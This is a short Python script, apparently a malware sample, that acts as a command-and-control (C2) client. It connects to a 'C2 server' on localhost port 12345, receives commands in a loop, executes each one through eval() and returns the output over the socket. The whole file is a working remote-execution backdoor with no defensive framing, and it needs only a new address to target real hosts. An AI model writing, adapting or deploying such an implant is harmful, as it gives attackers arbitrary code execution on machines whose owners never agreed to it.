# Copyright (c) 2026 transcrime
import socket

def main():
    client = socket.socket()
    client.connect(("127.0.0.1", 12345))

    print("[+] Connected to C2 server")

    while True:
        cmd = client.recv(2048).decode()
        if cmd.lower() == "exit":
            break
        result = command_console(cmd)
        client.send(result.encode())

    client.close()


def command_console(cmd):
    try:
        output = eval(cmd)
        return str(output)
    except Exception as e:
        return str(e)
    
if __name__ == "__main__":

     main()
